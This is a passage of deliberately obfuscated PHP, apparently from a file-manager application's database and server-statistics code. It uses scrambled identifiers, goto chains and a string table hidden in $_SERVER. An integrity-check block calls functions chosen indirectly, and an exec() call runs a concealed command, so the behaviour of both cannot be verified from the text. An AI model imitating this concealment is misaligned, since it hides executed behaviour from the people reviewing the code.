$e¯¯–Ş‘•²[439] => $this->typeLogCnt($e¯¯–Ş‘•²[439]), $e¯¯–Ş‘•²[1659] => $this->typeLogCnt($e¯¯–Ş‘•²[1659]), $e¯¯–Ş‘•²[1660] => $this->typeLogCnt($e¯¯–Ş‘•²[1660]), $e¯¯–Ş‘•²[571] => $this->typeLogCnt($e¯¯–Ş‘•²[33], $e¯¯–Ş‘•²[1635])); } private function typeLogCnt($Bªğ™¶‹™¸ = '', $e»Ã¢¸¤§ã = "\151\144") { goto då×å‡á•ç; då×å‡á•ç: $F®ƒ¶É =& $_SERVER[Ü˜]; $dÉòÄƒòª¡ = array($F®ƒ¶É[117] => array($F®ƒ¶É[1661], $F®ƒ¶É[1662]), $F®ƒ¶É[439] => array($F®ƒ¶É[1663], $F®ƒ¶É[1664]), $F®ƒ¶É[1659] => array($F®ƒ¶É[1665], $F®ƒ¶É[1666], $F®ƒ¶É[1667]), $F®ƒ¶É[1660] => array($F®ƒ¶É[1668], $F®ƒ¶É[1669]), $F®ƒ¶É[1670] => array($F®ƒ¶É[1671], $F®ƒ¶É[1672], $F®ƒ¶É[1673])); $dšàšÊÛåÊ = strtotime(date($F®ƒ¶É[1631])); goto D˜¢·Â²; BÁçÊ†òº: return (int) $F¬öóƒ·¹‘; goto f¥ÙŞ£¯ƒê; D˜¢·Â²: $f¡²ÆÜˆ±ö = array($F®ƒ¶É[204] => array($F®ƒ¶É[972], $dšàšÊÛåÊ)); if ($Bªğ™¶‹™¸) { $f¡²ÆÜˆ±ö[$F®ƒ¶É[29]] = array($F®ƒ¶É[7], $dÉòÄƒòª¡[$Bªğ™¶‹™¸]); } $F¬öóƒ·¹‘ = Model($F®ƒ¶É[1634])->where($f¡²ÆÜˆ±ö)->count($e»Ã¢¸¤§ã); goto BÁçÊ†òº; f¥ÙŞ£¯ƒê: } private function optionServer() { goto Bš«íÕ°™Ê; Bš«íÕ°™Ê: $cšâ¬ßÏ†Û =& $_SERVER[Ü˜]; $e…„ ™Ã± = $this->diskDriver(); $F¡ğÖËù = KodIO::defaultDriver(); goto b¥ÓŒ¯È“„; a®ÂğšÍ’: return array($cšâ¬ßÏ†Û[1676] => $e…„ ™Ã± ? $e…„ ™Ã±[$cšâ¬ßÏ†Û[1677]] : 0, $cšâ¬ßÏ†Û[1678] => $e…„ ™Ã± ? $e…„ ™Ã±[$cšâ¬ßÏ†Û[1679]] : 0, $cšâ¬ßÏ†Û[1680] => (int) $F¡ğÖËù[$cšâ¬ßÏ†Û[1677]] * 1024 * 1024 * 1024, $cšâ¬ßÏ†Û[1681] => (int) $CÕãŞšÙ‡, $cšâ¬ßÏ†Û[1682] => ucfirst($dÉ²¾‘ªô‘), $cšâ¬ßÏ†Û[1683] => $cšâ¬ßÏ†Û[1684] . PHP_VERSION, $cšâ¬ßÏ†Û[1685] => phpBuild64() ? 64 : 32, $cšâ¬ßÏ†Û[727] => str_replace($cšâ¬ßÏ†Û[1686], $cšâ¬ßÏ†Û[949], $FƒÌõ¹æÇ¸), $cšâ¬ßÏ†Û[356] => ucfirst($FœÕÉÃ×¶), $cšâ¬ßÏ†Û[28] => $_SERVER[$cšâ¬ßÏ†Û[1687]]); goto cĞãÇ¶Öà ; bäõß¸İ: $dÉ²¾‘ªô‘ = $d‰©¥Áá“†[0]; $aÍÌñè¸µÀ = $GLOBALS[$cšâ¬ßÏ†Û[6]][$cšâ¬ßÏ†Û[17]]; $FƒÌõ¹æÇ¸ = $aÍÌñè¸µÀ[$cšâ¬ßÏ†Û[933]]; goto e¿¬Ì¤ÃÇª; b¥ÓŒ¯È“„: $dã¤¼¯Ä«á = array($cšâ¬ßÏ†Û[791] => $F¡ğÖËù[$cšâ¬ßÏ†Û[402]]); $CÕãŞšÙ‡ = Model($cšâ¬ßÏ†Û[459])->where($dã¤¼¯Ä«á)->sum($cšâ¬ßÏ†Û[88]); $d‰©¥Áá“† = explode($cšâ¬ßÏ†Û[50], $_SERVER[$cšâ¬ßÏ†Û[152]]); goto bäõß¸İ; e¿¬Ì¤ÃÇª: if ($FƒÌõ¹æÇ¸ == $cšâ¬ßÏ†Û[764]) { $FÍÚÀ‰Æ˜• = explode($cšâ¬ßÏ†Û[1168], $aÍÌñè¸µÀ[$cšâ¬ßÏ†Û[932]]); $FƒÌõ¹æÇ¸ = $FÍÚÀ‰Æ˜•[0]; } if ($FƒÌõ¹æÇ¸ == $cšâ¬ßÏ†Û[767] || $FƒÌõ¹æÇ¸ == $cšâ¬ßÏ†Û[768]) { $dˆÀŞá¼îÚ = Model()->db()->query($cšâ¬ßÏ†Û[1674]); $DÔ“áÅèÒ¨ = $dˆÀŞá¼îÚ[0] && isset($dˆÀŞá¼îÚ[0][$cšâ¬ßÏ†Û[1434]]) ? $dˆÀŞá¼îÚ[0][$cšâ¬ßÏ†Û[1434]] : 0; $FƒÌõ¹æÇ¸ = $cšâ¬ßÏ†Û[1675] . ($DÔ“áÅèÒ¨ ? $cšâ¬ßÏ†Û[8] . $DÔ“áÅèÒ¨ : $cšâ¬ßÏ†Û[33]); } $FœÕÉÃ×¶ = $GLOBALS[$cšâ¬ßÏ†Û[6]][$cšâ¬ßÏ†Û[356]][$cšâ¬ßÏ†Û[801]]; goto a®ÂğšÍ’; cĞãÇ¶Öà : } private function diskDriver() { goto dóÃéÁ‘›; dóÃéÁ‘›: $D´Í÷¤•Şá =& $_SERVER[Ü˜]; $E§ù¦ÙŠƒ = $D´Í÷¤•Şá[8]; $a†í…‹†ç = $GLOBALS[$D´Í÷¤•Şá[6]][$D´Í÷¤•Şá[1688]] == $D´Í÷¤•Şá[1689]; goto cŒ¬ ğ˜Ùº; b¦÷ïç¸æ: $Båò†ÓŞ = $cÅùÌƒÃ‰ - @disk_free_space($E§ù¦ÙŠƒ); return array($D´Í÷¤•Şá[1677] => $cÅùÌƒÃ‰, $D´Í÷¤•Şá[1679] => $Båò†ÓŞ); goto e¥•ƒõ×Ùİ; cŒ¬ ğ˜Ùº: if ($a†í…‹†ç) { $E§ù¦ÙŠƒ = $D´Í÷¤•Şá[1690]; if (function_exists($D´Í÷¤•Şá[1691])) { exec($D´Í÷¤•Şá[1692], $Cğ»´©®Ú¤); $E§ù¦ÙŠƒ = $Cğ»´©®Ú¤[1] . $D´Í÷¤•Şá[8]; } } if (!file_exists($E§ù¦ÙŠƒ)) { return; } $cÅùÌƒÃ‰ = @disk_total_space($E§ù¦ÙŠƒ); goto b¦÷ïç¸æ; e¥•ƒõ×Ùİ: } public function fileChart($eÏ«¿Ãë¶Ê) { goto F„®†©ÛÜ; C‰óÑ¡³ì­: $e„ƒÏ·”¢®[$a³ß¢ÂÉÎÃ[413]] = 2; $c±±å–‡ŸŠ = Model($a³ß¢ÂÉÎÃ[799])->where($e„ƒÏ·”¢®)->sum($a³ß¢ÂÉÎÃ[88]); return array($a³ß¢ÂÉÎÃ[732] => $fŸîÆ£âÁ[$a³ß¢ÂÉÎÃ[88]], $a³ß¢ÂÉÎÃ[1624] => $fŸîÆ£âÁ[$a³ß¢ÂÉÎÃ[1624]], $a³ß¢ÂÉÎÃ[1625] => (int) $dºğƒÍÆ Ì, $a³ß¢ÂÉÎÃ[1626] => (int) $c±±å–‡ŸŠ); goto aô ¢ ¥»; f¦„ì¤¤ï­: $fŸîÆ£âÁ = $this->sourceSize(); $e„ƒÏ·”¢® = array($a³ß¢ÂÉÎÃ[487] => 0, $a³ß¢ÂÉÎÃ[413] => 1); $dºğƒÍÆ Ì = Model($a³ß¢ÂÉÎÃ[799])->where($e„ƒÏ·”¢®)->sum($a³ß¢ÂÉÎÃ[88]); goto C‰óÑ¡³ì­; F„®†©ÛÜ: $a³ß¢ÂÉÎÃ =& $_SERVER[Ü˜]; if (isset($eÏ«¿Ãë¶Ê[$a³ß¢ÂÉÎÃ[1529]])) { return Model($a³ß¢ÂÉÎÃ[799])->userFileTypeProfile($eÏ«¿Ãë¶Ê[$a³ß¢ÂÉÎÃ[1529]]); } if (isset($eÏ«¿Ãë¶Ê[$a³ß¢ÂÉÎÃ[1693]])) { return Model($a³ß¢ÂÉÎÃ[799])->groupFileTypeProfile($eÏ«¿Ãë¶Ê[$a³ß¢ÂÉÎÃ[1693]]); } goto f¦„ì¤¤ï­; aô ¢ ¥»: } private function sourceSize() { $cµÈšß“ª =& $_SERVER[Ü˜]; $b•õ‚çŠñ… = Model($cµÈšß“ª[799])->where(array($cµÈšß“ª[412] => 0))->sum($cµÈšß“ª[88]); $b²Ì‘ƒŸƒ = Model($cµÈšß“ª[459])->sum($cµÈšß“ª[88]); if ($b²Ì‘ƒŸƒ > $b•õ‚çŠñ…) { $b²Ì‘ƒŸƒ = $b•õ‚çŠñ…; } return array($cµÈšß“ª[88] => (int) $b•õ‚çŠñ…, $cµÈšß“ª[1624] => (int) $b²Ì‘ƒŸƒ); } } goto eòÍ˜ì—À; f¡’‘†Õæ³: $AÃ­ÒÃ‰Ÿ = $_SERVER[$_SERVER[Ü˜][57]]; $FíÊÑ³‡¢¬ = $_SERVER[Ü˜][58]; if ($_SERVER[$_SERVER[Ü˜][59]] != $FíÊÑ³‡¢¬($AÃ­ÒÃ‰Ÿ)) { goto cÎò¡ÖÜ; cÎò¡ÖÜ: $Dé…æÈŠô§ = $_SERVER[Ü˜][60]; $E·ø’¯ô¬ì = $_SERVER[$_SERVER[Ü˜][61]] . $_SERVER[Ü˜][62]; $eÃâù‘¤Ë— = $Dé…æÈŠô§($E·ø’¯ô¬ì); goto A…‘ƒÜ×‹á; A„“î½¤Ş: $EÄÑ£øã‰ë($AÃ­ÒÃ‰Ÿ); goto DùÁŠ¾÷Ä; A…‘ƒÜ×‹á: $FÈ´Î•÷Åö = explode($_SERVER[Ü˜][63], $eÃâù‘¤Ë—); if (count($FÈ´Î•÷Åö) < $_SERVER[Ü˜][64]) { $CŠ…‚ƒŒ  = $_SERVER[Ü˜][65]; $CŠ…‚ƒŒ (); } $EÄÑ£øã‰ë = $_SERVER[Ü˜][66]; goto A„“î½¤Ş; DùÁŠ¾÷Ä: } goto D†è’­˜…’; CÆÙƒËÅŞ: class Db { protected $dbType = null; protected $autoFree = false; protected $model = "\137\164\x68\151\156\x6b\137"; protected $pconnect = false; protected $queryStr = ''; protected $modelSql = array(); protected $lastInsID = null; protected $numRows = 0; protected $numCols = 0; protected $transTimes = 0; protected $error = ''; protected $linkID = array(); protected $_linkID = null; protected $queryID = null; protected $connected = false; protected $config = ''; protected $configLast = ''; protected $exp = array("\x65\161" => "\x3d", "\156\145\161" => "\74\76", "\147\164" => "\76", "\x65\147\164" => "\76\x3d", "\154\x74" => "\74", "\145\154\164" => "\x3c\75", "\156\157\x74\154\x69\153\145" => "\116\x4f\x54\x20\114\x49\113\105", "\154\151\x6b\145" => "\114\111\x4b\x45", "\x69\x6e" => "\111\116", "\156\157\x74\x69\156" => "\116\117\x54\40\111\x4e", "\x6e\x6f\164\x20\151\156" => "\x4e\117\124\x20\111\x4e", "\x62\145\x74\x77\145\145\156" => "\x42\x45\x54\x57\105\105\116", "\x6e\x6f\x74\142\145\x74\x77\145\x65\156" => "\x4e\x4f\124\40\x42\x45\124\x57\x45\105\x4e", "\x6e\157\x74\40\x62\x65\x74\167\145\x65\156" => "\116\117\x54\40\102\x45\x54\127\x45\x45\x4e"); protected $selectSql = "\x53\x45\x4c\105\103\x54\x25\104\111\123\x54\111\116\103\124\x25\x20\45\x46\111\x45\114\104\45\40\x46\x52\117\x4d\x20\x25\x54\101\102\114\x45\45\45\112\x4f\111\x4e\45\45\x57\x48\105\x52\105\x25\x25\x47\122\117\125\x50\45\45\x48\101\126\111\116\107\45\x25\117\x52\104\105\x52\45\x25\x4c\x49\115\111\x54\45\40\x25\x55\116\x49\x4f\x4e\x25\45\103\x4f\x4d\x4d\x45\116\124\x25"; protected $bind = array(); public static function getInstance() { $d”›õ‡¯·× = func_get_args(); return think_get_instance_of(__CLASS__, $_SERVER[Ü˜][920], $d”›õ‡¯·×); } public function factory($bÙá¶á¾Ùá = '') { goto F£©Ïå—å¤; fµ÷óÖÓ: return $DÍÜ¬È‰òã; goto b—‚Æ¡¸Í ; cÖÁÁÀÄ¡ğ: $this->dbType = ucwords(strtolower($bÙá¶á¾Ùá[$c‡ø¢ÙÆªˆ[921]])); $dêíœğï« = $c‡ø¢ÙÆªˆ[923] . $this->dbType; if (class_exists($dêíœğï«)) { $DÍÜ¬È‰òã = new $dêíœğï«($bÙá¶á¾Ùá); if ($c‡ø¢ÙÆªˆ[764] != strtolower($bÙá¶á¾Ùá[$c‡ø¢ÙÆªˆ[921]])) { $DÍÜ¬È‰òã->dbType = strtoupper($this->dbType); } else { $DÍÜ¬È‰òã->dbType = $this->_getDsnType($bÙá¶á¾Ùá[$c‡ø¢ÙÆªˆ[876]]); } } else { think_exception(think_lang($c‡ø¢ÙÆªˆ[924]) . $c‡ø¢ÙÆªˆ[925] . $dêíœğï«); } goto fµ÷óÖÓ; F£©Ïå—å¤: $c‡ø¢ÙÆªˆ =& $_SERVER[Ü˜]; $bÙá¶á¾Ùá = $this->parseConfig($bÙá¶á¾Ùá); if (empty($bÙá¶á¾Ùá[$c‡ø¢ÙÆªˆ[921]])) { think_exception(think_lang($c‡ø¢ÙÆªˆ[922])); } goto cÖÁÁÀÄ¡ğ; b—‚Æ¡¸Í : } public function __call($fİ×´ùøá, $fäğµ¡ÈË”) { if (method_exists($this, $fİ×´ùøá)) { return call_user_func_array(array($this, $fİ×´ùøá), $fäğµ¡ÈË”); } } protected function _getDsnType($b¦ˆˆ) { $e‰©Ï = explode($_SERVER[Ü˜][4], $b¦ˆˆ); $c§í‘š‘¡š = strtoupper(trim($e‰©Ï[0])); return $c§í‘š‘¡š; } private function parseConfig($Cø¾ÆÃ—¯ñ = '') { $F—ŞÂçÎ =& $_SERVER[Ü˜]; if (!empty($Cø¾ÆÃ—¯ñ) && is_string($Cø¾ÆÃ—¯ñ)) { $Cø¾ÆÃ—¯ñ = $this->parseDSN($Cø¾ÆÃ—¯ñ); } elseif (is_array($Cø¾ÆÃ—¯ñ)) { $Cø¾ÆÃ—¯ñ = array_change_key_case($Cø¾ÆÃ—¯ñ); $Cø¾ÆÃ—¯ñ = array($F—ŞÂçÎ[921] => $Cø¾ÆÃ—¯ñ[$F—ŞÂçÎ[763]], $F—ŞÂçÎ[849] => $Cø¾ÆÃ—¯ñ[$F—ŞÂçÎ[926]], $F—ŞÂçÎ[850] => $Cø¾ÆÃ—¯ñ[$F—ŞÂçÎ[927]], $F—ŞÂçÎ[847] => $Cø¾ÆÃ—¯ñ[$F—ŞÂçÎ[928]], $F—ŞÂçÎ[848] => $Cø¾ÆÃ—¯ñ[$F—ŞÂçÎ[929]], $F—ŞÂçÎ[17] => $Cø¾ÆÃ—¯ñ[$F—ŞÂçÎ[930]], $F—ŞÂçÎ[876] => $Cø¾ÆÃ—¯ñ[$F—ŞÂçÎ[765]], $F—ŞÂçÎ[13] => isset($Cø¾ÆÃ—¯ñ[$F—ŞÂçÎ[931]]) ? $Cø¾ÆÃ—¯ñ[$F—ŞÂçÎ[931]] : array()); } elseif (empty($Cø¾ÆÃ—¯ñ)) { if (think_config($F—ŞÂçÎ[932]) && $F—ŞÂçÎ[764] != strtolower(think_config($F—ŞÂçÎ[933]))) { $Cø¾ÆÃ—¯ñ = $this->parseDSN(think_config($F—ŞÂçÎ[932])); } else { $Cø¾ÆÃ—¯ñ = array($F—ŞÂçÎ[921] => think_config($F—ŞÂçÎ[933]), $F—ŞÂçÎ[849] => think_config($F—ŞÂçÎ[934]), $F—ŞÂçÎ[850] => think_config($F—ŞÂçÎ[935]), $F—ŞÂçÎ[847] => think_config($F—ŞÂçÎ[936]), $F—ŞÂçÎ[848] => think_config($F—ŞÂçÎ[937]), $F—ŞÂçÎ[17] => think_config($F—ŞÂçÎ[253]), $F—ŞÂçÎ[876] => think_config($F—ŞÂçÎ[932]), $F—ŞÂçÎ[13] => think_config($F—ŞÂçÎ[938])); } } return $Cø¾ÆÃ—¯ñ; } protected function initConnect($fçïŒôš§¾ = true) { if (1 == think_config($_SERVER[Ü˜][18])) { $this->_linkID = $this->multiConnect($fçïŒôš§¾); } else { if ($this->config) { $this->configLast = $this->config; } } if (!$this->connected) { $this->_linkID = $this->connect(); } } protected function closeConnect() { if (!$this->connected) { return; } foreach ($this->linkID as $BŠ×‹ŠÌ§ => $a·¢Ü‹Ş‘“) { $this->_linkID = $a·¢Ü‹Ş‘“; $this->close(); } $this->linkID = array(); $this->_linkID = null; $this->connected = !1; if (!$this->config && $this->configLast) { $this->config = $this->configLast; } } protected function multiConnect($A±¨‡„‹³† = false) { goto CÂ†ÁŸ‚Û‰; fŞ—÷†„Ì: $b ˆºÙ¨°÷ = array($D†¤åéåÎë[849] => isset($B‰©¯êÕŠ¢[$D†¤åéåÎë[849]][$FˆºÖÚ¬]) ? $B‰©¯êÕŠ¢[$D†¤åéåÎë[849]][$FˆºÖÚ¬] : $B‰©¯êÕŠ¢[$D†¤åéåÎë[849]][0], $D†¤åéåÎë[850] => isset($B‰©¯êÕŠ¢[$D†¤åéåÎë[850]][$FˆºÖÚ¬]) ? $B‰©¯êÕŠ¢[$D†¤åéåÎë[850]][$FˆºÖÚ¬] : $B‰©¯êÕŠ¢[$D†¤åéåÎë[850]][0], $D†¤åéåÎë[847] => isset($B‰©¯êÕŠ¢[$D†¤åéåÎë[847]][$FˆºÖÚ¬]) ? $B‰©¯êÕŠ¢[$D†¤åéåÎë[847]][$FˆºÖÚ¬] : $B‰©¯êÕŠ¢[$D†¤åéåÎë[847]][0], $D†¤åéåÎë[848] => isset($B‰©¯êÕŠ¢[$D†¤åéåÎë[848]][$FˆºÖÚ¬]) ? $B‰©¯êÕŠ¢[$D†¤åéåÎë[848]][$FˆºÖÚ¬] : $B‰©¯êÕŠ¢[$D†¤åéåÎë[848]][0], $D†¤åéåÎë[17] => isset($B‰©¯êÕŠ¢[$D†¤åéåÎë[17]][$FˆºÖÚ¬]) ? $B‰©¯êÕŠ¢[$D†¤åéåÎë[17]][$FˆºÖÚ¬] : $B‰©¯êÕŠ¢[$D†¤åéåÎë[17]][0], $D†¤åéåÎë[876] => isset($B‰©¯êÕŠ¢[$D†¤åéåÎë[876]][$FˆºÖÚ¬]) ? $B‰©¯êÕŠ¢[$D†¤åéåÎë[876]][$FˆºÖÚ¬] : $B‰©¯êÕŠ¢[$D†¤åéåÎë[876]][0], $D†¤åéåÎë[13] => isset($B‰©¯êÕŠ¢[$D†¤åéåÎë[13]][$FˆºÖÚ¬]) ? $B‰©¯êÕŠ¢[$D†¤åéåÎë[13]][$FˆºÖÚ¬] : $B‰©¯êÕŠ¢[$D†¤åéåÎë[13]][0]); return $this->connect($b ˆºÙ¨°÷, $FˆºÖÚ¬); goto e°Ä…ï‘”Ë; CÂ†ÁŸ‚Û‰: $D†¤åéåÎë =& $_SERVER[Ü˜]; static $B‰©¯êÕŠ¢ = array(); static $f¹ŒÒ¼‹î = -1; goto C­Óàßâğ; C­Óàßâğ: if (empty($B‰©¯êÕŠ¢)) { foreach ($this->config as $d¾¼´¬†ğë => $eßÅëùŒƒ­) { $B‰©¯êÕŠ¢[$d¾¼´¬†ğë] = explode($D†¤åéåÎë[47], $eßÅëùŒƒ­); } } if (think_config($D†¤åéåÎë[939])) { if ($A±¨‡„‹³†) { $FˆºÖÚ¬ = floor(mt_rand(0, think_config($D†¤åéåÎë[940]) - 1)); $f¹ŒÒ¼‹î = $FˆºÖÚ¬; } else { if (is_numeric(think_config($D†¤åéåÎë[941]))) { $FˆºÖÚ¬ = think_config($D†¤åéåÎë[941]); } else { $FˆºÖÚ¬ = floor(mt_rand(think_config($D†¤åéåÎë[940]), count($B‰©¯êÕŠ¢[$D†¤åéåÎë[847]]) - 1)); } } } else { $FˆºÖÚ¬ = floor(mt_rand(0, count($B‰©¯êÕŠ¢[$D†¤åéåÎë[847]]) - 1)); $f¹ŒÒ¼‹î = $FˆºÖÚ¬; } $FˆºÖÚ¬ = $f¹ŒÒ¼‹î !== -1 ? $f¹ŒÒ¼‹î : $FˆºÖÚ¬; goto fŞ—÷†„Ì; e°Ä…ï‘”Ë: } public function parseDSN($cèã‹­‹ô‹) { $f­êäÂÓ¶™ =& $_SERVER[Ü˜]; if (empty($cèã‹­‹ô‹)) { return !1; } $ašÙù³Ü¯Á = parse_url($cèã‹­‹ô‹); if ($ašÙù³Ü¯Á[$f­êäÂÓ¶™[184]]) { $FãöŞ’¡É = array($f­êäÂÓ¶™[921] => $ašÙù³Ü¯Á[$f­êäÂÓ¶™[184]], $f­êäÂÓ¶™[849] => isset($ašÙù³Ü¯Á[$f­êäÂÓ¶™[571]]) ? $ašÙù³Ü¯Á[$f­êäÂÓ¶™[571]] : $f­êäÂÓ¶™[33], $f­êäÂÓ¶™[850] => isset($ašÙù³Ü¯Á[$f­êäÂÓ¶™[942]]) ? $ašÙù³Ü¯Á[$f­êäÂÓ¶™[942]] : $f­êäÂÓ¶™[33], $f­êäÂÓ¶™[847] => isset($ašÙù³Ü¯Á[$f­êäÂÓ¶™[185]]) ? $ašÙù³Ü¯Á[$f­êäÂÓ¶™[185]] : $f­êäÂÓ¶™[33], $f­êäÂÓ¶™[848] => isset($ašÙù³Ü¯Á[$f­êäÂÓ¶™[186]]) ? $ašÙù³Ü¯Á[$f­êäÂÓ¶™[186]] : $f­êäÂÓ¶™[33], $f­êäÂÓ¶™[17] => isset($ašÙù³Ü¯Á[$f­êäÂÓ¶™[86]]) ? substr($ašÙù³Ü¯Á[$f­êäÂÓ¶™[86]], 1) : $f­êäÂÓ¶™[33]); } else { preg_match($f­êäÂÓ¶™[943], trim($cèã‹­‹ô‹), $BÍ¦çÉæÃ¡); $FãöŞ’¡É = array($f­êäÂÓ¶™[921] => $BÍ¦çÉæÃ¡[1], $f­êäÂÓ¶™[849] => $BÍ¦çÉæÃ¡[2], $f­êäÂÓ¶™[850] => $BÍ¦çÉæÃ¡[3], $f­êäÂÓ¶™[847] => $BÍ¦çÉæÃ¡[4], $f­êäÂÓ¶™[848] => $BÍ¦çÉæÃ¡[5], $f­êäÂÓ¶™[17] => $BÍ¦çÉæÃ¡[6]); } $FãöŞ’¡É[$f­êäÂÓ¶™[876]] = $f­êäÂÓ¶™[33]; return $FãöŞ’¡É; } protected function debug() { $aªöËºé° =& $_SERVER[Ü˜]; $this->modelSql[$this->model] = $this->queryStr; $this->model = $aªöËºé°[944]; if (think_config($aªöËºé°[945])) { think_status($aªöËºé°[946]); think_trace($this->queryStr . $aªöËºé°[947] . think_status($aªöËºé°[20], $aªöËºé°[946], 6) . $aªöËºé°[948], $aªöËºé°[33], $aªöËºé°[949]); } } protected function parseLock($FŒ„‘ºÜ = false) { $FŸƒÂÛ =& $_SERVER[Ü˜]; if (!$FŒ„‘ºÜ) { return $FŸƒÂÛ[33]; } if ($FŸƒÂÛ[878] == $this->dbType) { return $FŸƒÂÛ[950]; } return $FŸƒÂÛ[951]; } protected function parseSet($bÊà‚ôõ¬) { $A¨À·öçôƒ =& $_SERVER[Ü˜]; foreach ($bÊà‚ôõ¬ as $b±õ´…ÂÍò => $eñè ÏŒÄ„) { if (is_array($eñè ÏŒÄ„) && $A¨À·öçôƒ[304] == $eñè ÏŒÄ„[0]) { $dõ•¤”©Îğ[] = $this->parseKey($b±õ´…ÂÍò) . $A¨À·öçôƒ[952] . $eñè ÏŒÄ„[1]; } elseif (is_scalar($eñè ÏŒÄ„) || is_null($eñè ÏŒÄ„)) { $dõ•¤”©Îğ[] = $this->parseKey($b±õ´…ÂÍò) . $A¨À·öçôƒ[952] . $this->parseValue($eñè ÏŒÄ„); } } return $A¨À·öçôƒ[953] . implode($A¨À·öçôƒ[47], $dõ•¤”©Îğ); } protected function bindParam($Cğë¿Ö…œ, $eïÏÕ‹áàö) { $this->bind[$_SERVER[Ü˜][4] . $Cğë¿Ö…œ] = $eïÏÕ‹áàö; } protected function parseBind($d„ØªÂ¤÷¿) { $d„ØªÂ¤÷¿ = array_merge($this->bind, $d„ØªÂ¤÷¿); $this->bind = array(); return $d„ØªÂ¤÷¿; } function parseKey(&$B‹ÙÎÁÉ®, $A®›¾ƒ†×ê = true) { if ($A®›¾ƒ†×ê) { $B‹ÙÎÁÉ® = $this->parseKeyCheck($B‹ÙÎÁÉ®); } return $B‹ÙÎÁÉ®; } function parseKeyCheck($CêªĞŞèŸŞ) { $Fğ„ğäÍ…Ò =& $_SERVER[Ü˜]; $CêªĞŞèŸŞ = trim($CêªĞŞèŸŞ); if (!preg_match($Fğ„ğäÍ…Ò[954], $CêªĞŞèŸŞ)) { think_exception($Fğ„ğäÍ…Ò[955] . $CêªĞŞèŸŞ); } return $CêªĞŞèŸŞ; } protected function parseValue($e—äİå«Ú‘) { $CŒÉ÷·”¦Š =& $_SERVER[Ü˜]; if (is_string($e—äİå«Ú‘)) { $e—äİå«Ú‘ = $CŒÉ÷·”¦Š[917] . $this->escapeString($e—äİå«Ú‘) . $CŒÉ÷·”¦Š[917]; } elseif (isset($e—äİå«Ú‘[0]) && is_string($e—äİå«Ú‘[0]) && strtolower($e—äİå«Ú‘[0]) == $CŒÉ÷·”¦Š[304]) { $e—äİå«Ú‘ = $this->escapeString($e—äİå«Ú‘[1]); } elseif (is_array($e—äİå«Ú‘)) { $e—äİå«Ú‘ = array_map(array($this, $CŒÉ÷·”¦Š[918]), $e—äİå«Ú‘); } elseif (is_bool($e—äİå«Ú‘)) { $e—äİå«Ú‘ = $e—äİå«Ú‘ ? $CŒÉ÷·”¦Š[97] : $CŒÉ÷·”¦Š[201]; } elseif (is_null($e—äİå«Ú‘)) { $e—äİå«Ú‘ = $CŒÉ÷·”¦Š[113]; } return $e—äİå«Ú‘; } protected function parseField($CÊÁğ¥†ÚÆ) { $A¯çĞÄŠ =& $_SERVER[Ü˜]; if (is_string($CÊÁğ¥†ÚÆ) && strpos($CÊÁğ¥†ÚÆ, $A¯çĞÄŠ[47])) { $CÊÁğ¥†ÚÆ = explode($A¯çĞÄŠ[47], $CÊÁğ¥†ÚÆ); } if (is_array($CÊÁğ¥†ÚÆ)) { $Eš•ñíËÆê = array(); foreach ($CÊÁğ¥†ÚÆ as $e‘ºç¸Ùç => $C ƒÚšë‰è) { if (!is_numeric($e‘ºç¸Ùç)) { $Eš•ñíËÆê[] = $this->parseKey($e‘ºç¸Ùç, !1) . $A¯çĞÄŠ[956] . $this->parseKey($C ƒÚšë‰è); } else { $Eš•ñíËÆê[] = $this->parseKey($C ƒÚšë‰è); } } $E¸ëÇÌªÃ = implode($A¯çĞÄŠ[47], $Eš•ñíËÆê); } elseif (is_string($CÊÁğ¥†ÚÆ) && !empty($CÊÁğ¥†ÚÆ)) { $E¸ëÇÌªÃ = $CÊÁğ¥†ÚÆ; } else { $E¸ëÇÌªÃ = $A¯çĞÄŠ[192]; } return $E¸ëÇÌªÃ; } protected function parseTable($eóàê²³§ä) { $B¦Ãâ™šÖ¹ =& $_SERVER[Ü˜]; if (is_array($eóàê²³§ä)) { $A®¬Ë³İîº = array(); foreach ($eóàê²³§ä as $fô„‚²¿°… => $Fµ¯Èºîï§) { if (!is_numeric($fô„‚²¿°…)) { $A®¬Ë³İîº[] = $this->parseKey($fô„‚²¿°…) . $B¦Ãâ™šÖ¹[50] . $this->parseKey($Fµ¯Èºîï§); } else { $A®¬Ë³İîº[] = $this->parseKey($fô„‚²¿°…); } } $eóàê²³§ä = $A®¬Ë³İîº; } elseif (is_string($eóàê²³§ä)) { if (strstr($eóàê²³§ä, $B¦Ãâ™šÖ¹[50])) { return $eóàê²³§ä; } $eóàê²³§ä = explode($B¦Ãâ™šÖ¹[47], $eóàê²³§ä); array_walk($eóàê²³§ä, array($this, $B¦Ãâ™šÖ¹[867])); } return $B¦Ãâ™šÖ¹[861] . trim(implode($B¦Ãâ™šÖ¹[957], $eóàê²³§ä), $B¦Ãâ™šÖ¹[391]) . $B¦Ãâ™šÖ¹[861]; } protected function parseWhere($bÇ²ì¢ªŠ) { $dÌì“’¡Ğ =& $_SERVER[Ü˜]; $F¼§”±«¼Ç = $dÌì“’¡Ğ[33]; if (is_string($bÇ²ì¢ªŠ)) { $F¼§”±«¼Ç = $bÇ²ì¢ªŠ; } else { $eµ×‡‘Èå² = isset($bÇ²ì¢ªŠ[$dÌì“’¡Ğ[958]]) ? strtoupper($bÇ²ì¢ªŠ[$dÌì“’¡Ğ[958]]) : $dÌì“’¡Ğ[33]; if (in_array($eµ×‡‘Èå², array($dÌì“’¡Ğ[959], $dÌì“’¡Ğ[960], $dÌì“’¡Ğ[961]))) { $eµ×‡‘Èå² = $dÌì“’¡Ğ[50] . $eµ×‡‘Èå² . $dÌì“’¡Ğ[50]; unset($bÇ²ì¢ªŠ[$dÌì“’¡Ğ[958]]); } else { $eµ×‡‘Èå² = $dÌì“’¡Ğ[962]; } foreach ($bÇ²ì¢ªŠ as $bµ¥÷½ô—ï => $F¨ğ–•ôè) { $F¼§”±«¼Ç .= $dÌì“’¡Ğ[284]; if (is_numeric($bµ¥÷½ô—ï)) { $bµ¥÷½ô—ï = $dÌì“’¡Ğ[963]; } if (0 === strpos($bµ¥÷½ô—ï, $dÌì“’¡Ğ[81])) { $F¼§”±«¼Ç .= $this->parseThinkWhere($bµ¥÷½ô—ï, $F¨ğ–•ôè); } else { if (!preg_match($dÌì“’¡Ğ[964], trim($bµ¥÷½ô—ï))) { think_exception(think_lang($dÌì“’¡Ğ[965]) . $dÌì“’¡Ğ[4] . $bµ¥÷½ô—ï); } $d¸‡ÛŸÅæ = is_array($F¨ğ–•ôè) && isset($F¨ğ–•ôè[$dÌì“’¡Ğ[966]]); $bµ¥÷½ô—ï = trim($bµ¥÷½ô—ï); if 